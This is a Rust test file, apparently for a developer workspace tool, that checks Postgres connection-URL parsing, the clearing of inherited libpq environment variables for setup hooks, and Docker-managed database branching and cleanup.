    // hostaddr is kept and a repeated sslmode resolves to the last value, so a
    // hook's psql goes where DATABASE_URL goes. Prisma-style `schema=` stays in
    // the URL and is not a libpq setting.
    let url = "postgres://app:pw@db.example:6543/app?hostaddr=192.0.2.44&sslmode=disable&sslmode=require&schema=public";
    let out = attach("hostaddr", url).unwrap();
    let env = env_map(&out.workspace);
    assert_eq!(env["DATABASE_URL"], url);
    assert_eq!(env["PGHOST"], "db.example");
    assert_eq!(env["PGHOSTADDR"], "192.0.2.44");
    assert_eq!(env["PGPORT"], "6543");
    assert_eq!(env["PGSSLMODE"], "require");
    assert_eq!(env["PGDATABASE"], "app");
    assert!(
        env.keys()
            .all(|k| !k.to_ascii_lowercase().contains("schema")),
        "{env:?}"
    );
    assert_eq!(
        std::fs::read_to_string(out.workspace.path.join(".devflow/seen"))
            .unwrap()
            .trim(),
        "db.example|192.0.2.44|6543|require|app|unset"
    );
    let binding = out.receipt.data.unwrap();
    assert_eq!(
        (binding.database.as_str(), binding.role.as_str()),
        ("app", "app")
    );

    // IPv6 literal, and a query-string password with an encoded name.
    let out = attach("v6", "postgresql://u@[2001:db8::7]:5433/d?%70assword=p%2Fw").unwrap();
    let env = env_map(&out.workspace);
    assert_eq!(env["PGHOST"], "2001:db8::7");
    assert_eq!(env["PGPORT"], "5433");
    assert_eq!(env["PGPASSWORD"], "p/w");
    assert_eq!(
        env["DATABASE_URL"],
        "postgresql://u@[2001:db8::7]:5433/d?%70assword=p%2Fw"
    );

    // Rejected before anything is created: no worktree, no branch, no receipt.
    for (bad, expected) in [
        ("postgres://u:topsecret@h1,h2/d", "several hosts"),
        ("postgres://u:topsecret@h/d?sslpassword=x", "sslpassword"),
        (
            "postgres://u:topsecret@h/d?replication=database",
            "replication",
        ),
        ("mysql://u:topsecret@h/d", "postgres://"),
        ("host=h password=topsecret", "postgres://"),
    ] {
        let name = format!("bad-{}", expected.replace(['/', ':', ' '], ""));
        let error = attach(&name, bad).unwrap_err();
        let shown = format!("{error:#}");
        assert!(shown.contains("--database-url"), "{bad}: {shown}");
        assert!(shown.contains(expected), "{bad}: {shown}");
        assert!(!shown.contains("topsecret"), "{shown}");
        assert!(
            worktree::find(&t.project, &name).unwrap().is_none(),
            "{bad}"
        );
        assert!(
            t.project
                .repo()
                .unwrap()
                .find_branch(&name, git2::BranchType::Local)
                .is_err(),
            "{bad}: no branch left behind"
        );
    }
    assert_eq!(worktree::list(&t.project).unwrap().len(), 3);
    // An existing worktree is checked the same way before setup touches it.
    let raw = worktree::create(&t.project, "existing", None).unwrap();
    let error = setup::setup(
        &t.project,
        &raw,
        SetupOptions {
            database_url: Some("postgres://u@h1,h2/d".into()),
            ..Default::default()
        },
        false,
        false,
        &mut NoProgress,
    )
    .unwrap_err();
    assert!(format!("{error:#}").contains("several hosts"), "{error:#}");
    assert!(Receipt::load(&raw.git_dir).unwrap().is_none());
}

#[test]
fn hooks_see_the_workspace_connection_not_inherited_libpq_variables() {
    const NAME: &str = "hooks_see_the_workspace_connection_not_inherited_libpq_variables";
    let inherited = [
        ("PGPORT", "6543"),
        ("PGHOST", "inherited.example"),
        ("PGSERVICE", "svc"),
        ("PGHOSTADDR", "10.9.9.9"),
        ("PGOPTIONS", "-c x=1"),
        ("PGPASSWORD", "inherited-secret"),
        // Not named by the URL below, so they must be gone, not merely differ.
        ("PGSSLMODE", "disable"),
        ("PGSSLROOTCERT", "/inherited/ca.pem"),
        ("PGPASSFILE", "/inherited/pgpass"),
        ("PGCONNECT_TIMEOUT", "99"),
        ("PGAPPNAME", "inherited"),
        ("PGSERVICEFILE", "/inherited/services"),
        ("PGSYSCONFDIR", "/inherited/etc"),
    ];
    if !in_child(NAME, &inherited) {
        return;
    }
    let t = repo(
        &Hooks {
            setup: &[
                "echo \"$PGHOST|$PGPORT|$PGUSER|$PGDATABASE|${PGSERVICE-unset}|${PGHOSTADDR-unset}|${PGOPTIONS-unset}|$PGPASSWORD\" > .devflow/seen",
                "echo \"${PGSSLMODE-unset}|${PGSSLROOTCERT-unset}|${PGPASSFILE-unset}|${PGCONNECT_TIMEOUT-unset}|${PGAPPNAME-unset}|${PGSERVICEFILE-unset}|${PGSYSCONFDIR-unset}\" > .devflow/seen-more",
            ],
            ..Default::default()
        },
        "",
    );
    // The port is only given as a query parameter.
    let out = create(
        &t.project,
        "attached",
        SetupOptions {
            database_url: Some("postgres://app:s3cretpw@localhost/app?port=5434".into()),
            trust_hooks: true,
            ..Default::default()
        },
    )
    .unwrap();
    let env = env_map(&out.workspace);
    assert_eq!(env["PGPORT"], "5434");
    assert_eq!(env["PGHOST"], "localhost");
    assert_eq!(env["PGUSER"], "app");
    assert_eq!(env["PGDATABASE"], "app");
    assert_eq!(
        std::fs::read_to_string(out.workspace.path.join(".devflow/seen"))
            .unwrap()
            .trim(),
        "localhost|5434|app|app|unset|unset|unset|s3cretpw"
    );
    assert_eq!(
        std::fs::read_to_string(out.workspace.path.join(".devflow/seen-more"))
            .unwrap()
            .trim(),
        "unset|unset|unset|unset|unset|unset|unset",
        "every connection-affecting variable is cleared, not just the common ones"
    );

    // Without a database there is nothing to disagree with: the user's own
    // environment is left alone.
    let out = create(
        &t.project,
        "nodb",
        SetupOptions {
            no_db: true,
            trust_hooks: true,
            ..Default::default()
        },
    )
    .unwrap();
    assert_eq!(
        std::fs::read_to_string(out.workspace.path.join(".devflow/seen"))
            .unwrap()
            .trim(),
        "inherited.example|6543|||svc|10.9.9.9|-c x=1|inherited-secret"
    );
    assert_eq!(
        std::fs::read_to_string(out.workspace.path.join(".devflow/seen-more"))
            .unwrap()
            .trim(),
        "disable|/inherited/ca.pem|/inherited/pgpass|99|inherited|/inherited/services|/inherited/etc"
    );
}

// ---------------------------------------------------------------------------
// Tests below need external programs. Run with `-- --ignored`.

/// Removes a project's managed compose project (containers and volume) and
/// stops the isolated pitchfork supervisor, even when the test panics.
struct Cleanup(Box<dyn FnMut()>);

impl Drop for Cleanup {
    fn drop(&mut self) {
        (self.0)();
    }
}

fn docker_compose(args: &[&str]) -> String {
    let out = std::process::Command::new("docker")
        .arg("compose")
        .args(args)
        .output()
        .expect("docker is available");
    String::from_utf8_lossy(&out.stdout).into_owned()
}

#[test]
#[ignore = "needs Docker and the postgres:18 image"]
fn managed_postgres_create_clone_reset_and_remove() {
    let t = repo(
        &Hooks {
            setup: &["echo \"$DATABASE_URL\" > .devflow/db-url"],
            ..Default::default()
        },
        "[postgres]\nmode = \"managed\"\nimage = \"postgres:18\"\ndatabase = \"shop\"\n",
    );
    trust::approve(&t.project).unwrap();
    let project = t.project.clone();
    let _cleanup = Cleanup(Box::new(move || {
        let file = devflow_core::paths::data_dir()
            .unwrap()
            .join("postgres")
            .join(project.id().to_string())
            .join("compose.yaml");
        let needle = file.display().to_string();
        let listing = docker_compose(&["ls", "-a", "--format", "json"]);
        let projects: Vec<serde_json::Value> = serde_json::from_str(&listing).unwrap_or_default();
        for p in projects {
            if p["ConfigFiles"]
                .as_str()
                .is_some_and(|f| f.contains(&needle))
                && let Some(name) = p["Name"].as_str()
            {
                docker_compose(&["-p", name, "down", "-v", "--remove-orphans"]);
            }
        }
    }));
    let connect = |url: &str| postgres::Client::connect(url, postgres::NoTls);
    let count = |url: &str| -> i64 {
        connect(url)
            .unwrap()
            .query_one("SELECT count(*) FROM t", &[])
            .unwrap()
            .get(0)
    };

    // a: the first workspace gets an empty branch cloned from the implicit root branch.
    let a = create(&t.project, "feature/a", SetupOptions::default()).unwrap();
    assert_eq!(a.status, Status::Ready, "{:?}", a.receipt.phases);
    let binding_a = a.receipt.data.clone().unwrap();
    assert!(binding_a.owned && binding_a.branch_id.is_some());
    assert_eq!(binding_a.source, "workspace:main");
    let root = receipt_of(&ws(&t.project, "main"));
    assert!(
        root.data.as_ref().unwrap().branch_id.is_some(),
        "the default workspace got a root branch"
    );
    assert_eq!(
        a.receipt.data_source_id,
        Some(format!(
            "branch:{}",
            root.data.as_ref().unwrap().branch_id.unwrap()
        )),
        "the resolved source is recorded next to the user-facing one"
    );
    assert_eq!(env_map(&a.workspace)["DATABASE_URL"], binding_a.url);
    assert_eq!(
        std::fs::read_to_string(a.workspace.path.join(".devflow/db-url"))
            .unwrap()
            .trim(),
        binding_a.url
    );
    connect(&binding_a.url)
        .unwrap()
        .batch_execute("CREATE TABLE t(x int); INSERT INTO t VALUES (1)")
        .unwrap();

    // b clones a's data and is isolated from it.
    let b = create(
        &t.project,
        "feature/b",
        SetupOptions {
            data_from: Some(DataSource::Workspace {
                name: "feature/a".into(),
            }),
            ..Default::default()
        },
    )
    .unwrap();
    let binding_b = b.receipt.data.clone().unwrap();
    assert_eq!(binding_b.source, "workspace:feature/a");
    assert_eq!(
        b.receipt.data_source_id,
        Some(format!("branch:{}", binding_a.branch_id.unwrap()))
    );
    assert_eq!(count(&binding_b.url), 1);
    connect(&binding_b.url)
        .unwrap()
        .batch_execute("INSERT INTO t VALUES (2)")
        .unwrap();
    assert_eq!(count(&binding_a.url), 1, "a does not see b's write");

    // snapshot a, then reset b to it and back to its recorded source.
    let snap = setup::snapshot(&t.project, &a.workspace, "seed").unwrap();
    assert_eq!(snap.version, 1);
    setup::reset_data(
        &t.project,
        &b.workspace,
        Some(DataSource::Snapshot {
            name: "seed".into(),
            version: None,
        }),
    )
    .unwrap();
    assert_eq!(count(&binding_b.url), 1, "same URL after reset");
    connect(&binding_a.url)
        .unwrap()
        .batch_execute("INSERT INTO t VALUES (3)")
        .unwrap();
    setup::reset_data(&t.project, &b.workspace, None).unwrap();
    assert_eq!(
        count(&binding_b.url),
        2,
        "reset to the recorded source clones a's current data"
    );

    // The default reset follows b's immutable provenance (a's branch), never
    // the name `feature/a`: remove a keeping its data, reset b (the name no
    // longer resolves to anything), then give the name to a workspace with
    // other data and reset b again.
    let server = devflow_core::db::Server::for_project(&t.project)
        .unwrap()
        .unwrap();
    let kept = setup::remove(
        &t.project,
        "feature/a",
        RemoveOptions {
            keep_data: true,
            ..Default::default()
        },
        &mut NoProgress,
    )
    .unwrap();
    assert_eq!(kept.dropped_branch, None);
    assert!(
        server
            .branch(binding_a.branch_id.unwrap())
            .unwrap()
            .is_some()
    );
    connect(&binding_b.url)
        .unwrap()
        .batch_execute("INSERT INTO t VALUES (99)")
        .unwrap();
    setup::reset_data(&t.project, &b.workspace, None).unwrap();
    assert_eq!(
        count(&binding_b.url),
        2,
        "reset clones the kept branch of the removed workspace"
    );
    let a2 = create(
        &t.project,
        "feature/a",
        SetupOptions {
            data_from: Some(DataSource::Empty),
            ..Default::default()
        },
    )
    .unwrap();
    let binding_a2 = a2.receipt.data.clone().unwrap();
    assert_ne!(binding_a2.branch_id, binding_a.branch_id);
    connect(&binding_a2.url)
        .unwrap()
        .batch_execute("CREATE TABLE t(x int); INSERT INTO t SELECT generate_series(1, 7)")
        .unwrap();
    connect(&binding_b.url)
        .unwrap()
        .batch_execute("INSERT INTO t VALUES (99)")
        .unwrap();
    setup::reset_data(&t.project, &b.workspace, None).unwrap();
    assert_eq!(
        count(&binding_b.url),
        2,
        "the new feature/a (7 rows) is not b's source"
    );

    // A retry after a crash clones exactly the source the first attempt
    // pinned, even though `feature/a` now names another branch.
    let retry = worktree::create(&t.project, "retry", None).unwrap();
    let mut pinned = Receipt::new(t.project.id(), "retry", Some("main".into()));
    pinned.set_phase(Phase::Materialize, PhaseState::Done, None);
    pinned.data_source = Some("workspace:feature/a".into());
    pinned.data_source_id = Some(format!("branch:{}", binding_a.branch_id.unwrap()));
    pinned.save(&retry.git_dir).unwrap();
    let out = setup::setup(
        &t.project,
        &retry,
        SetupOptions::default(),
        false,
        false,
        &mut NoProgress,
    )
    .unwrap()
    .unwrap();
    assert_eq!(out.status, Status::Ready, "{:?}", out.receipt.phases);
    let binding_retry = out.receipt.data.clone().unwrap();
    assert_eq!(binding_retry.source, "workspace:feature/a");
    assert_eq!(
        count(&binding_retry.url),
        2,
        "the pinned branch, not the 7-row one"
    );

    // Removing b drops its branch; the kept branch of the old a and the root stay.
    let out = setup::remove(
        &t.project,
        "feature/b",
        RemoveOptions::default(),
        &mut NoProgress,
    )
    .unwrap();
    assert_eq!(out.dropped_branch, binding_b.branch_id);
    assert!(
        server
            .branch(binding_b.branch_id.unwrap())
            .unwrap()
            .is_none()
    );
    assert!(
        server
            .branch(binding_a.branch_id.unwrap())
            .unwrap()
            .is_some()
    );
    assert!(connect(&binding_b.url).is_err());

    // --keep-data leaves the branch behind.
    let out = setup::remove(
        &t.project,
        "feature/a",
        RemoveOptions {
            keep_data: true,
            ..Default::default()
        },
        &mut NoProgress,
    )
    .unwrap();
    assert_eq!(out.dropped_branch, None);
    assert!(
        server
            .branch(binding_a2.branch_id.unwrap())
            .unwrap()
            .is_some()
    );
    server.down().unwrap();
}

#[test]
#[ignore = "needs pitchfork on PATH"]
fn pitchfork_lists_starts_and_stops_a_daemon() {
    use devflow_core::pitchfork;
    let base = init();
    assert!(
        pitchfork::available(),
        "pitchfork is not on PATH; try `mise x pitchfork@2.29.0 -- cargo test -p devflow-core --test workspace -- --ignored pitchfork`"
    );
    let stop_supervisor = || {
        let _ = std::process::Command::new(pitchfork::binary().unwrap())
            .args(["supervisor", "stop"])
            .output();
    };
    let _cleanup = Cleanup(Box::new(stop_supervisor));
    let dir = base.join("pf-project");
    std::fs::create_dir_all(&dir).unwrap();
    std::fs::write(
        dir.join("pitchfork.toml"),
        "[daemons.sleeper]\nrun = \"sleep 600\"\n",
    )
    .unwrap();

    let found = pitchfork::daemons(&dir).unwrap();
    assert_eq!(found.len(), 1, "{found:?}");
    assert_eq!(found[0].status, "available");
    let id = found[0].id.clone();
    assert!(id.ends_with("/sleeper"), "{id}");

    pitchfork::start(&dir, &id).unwrap();
    let found = pitchfork::daemons(&dir).unwrap();
    assert_eq!(found[0].status, "running");
    assert!(found[0].pid.is_some());

    pitchfork::stop(&dir, &id).unwrap();
    let found = pitchfork::daemons(&dir).unwrap();
    assert_ne!(found[0].status, "running");
    assert!(pitchfork::start(&dir, "--all").is_err());
    // An empty directory has no daemons.
    let empty = base.join("pf-empty");
    std::fs::create_dir_all(&empty).unwrap();
    assert!(pitchfork::daemons(&empty).unwrap().is_empty());
}

#[allow(dead_code)]
fn _config_is_used(_: &Config) {}

#[test]
fn a_receiptless_worktree_recreated_in_place_is_never_removed_from_a_stale_view() {
    let t = repo(&Hooks::default(), "");
    // A checkout devflow never set up (no receipt), as shown in a list.
    let shown = worktree::create(&t.project, "plain", None).unwrap();
    let listed = worktree::find(&t.project, "plain").unwrap().unwrap();
    assert!(listed.fingerprint.is_some());
    let view = expecting(&listed, None);

    // Outside devflow: removed and recreated at the same path and branch,
    // then given work that must not be lost.
    worktree::remove(&t.project, &listed).unwrap();
    let again = worktree::create(&t.project, "plain", None).unwrap();
    assert_eq!(again.path, shown.path);
    std::fs::write(again.path.join("precious.txt"), "keep me").unwrap();

    for force in [false, true] {
        let error = setup::remove(
            &t.project,
            "plain",
            RemoveOptions {
                force,
                expect: Some(view.clone()),
                ..Default::default()
            },
            &mut NoProgress,
        )
        .unwrap_err();
        assert!(!protection(&error).forceable, "{error:#}");
        assert!(error.to_string().contains("replaced"), "{error:#}");
        assert!(again.path.join("precious.txt").exists());
    }
}
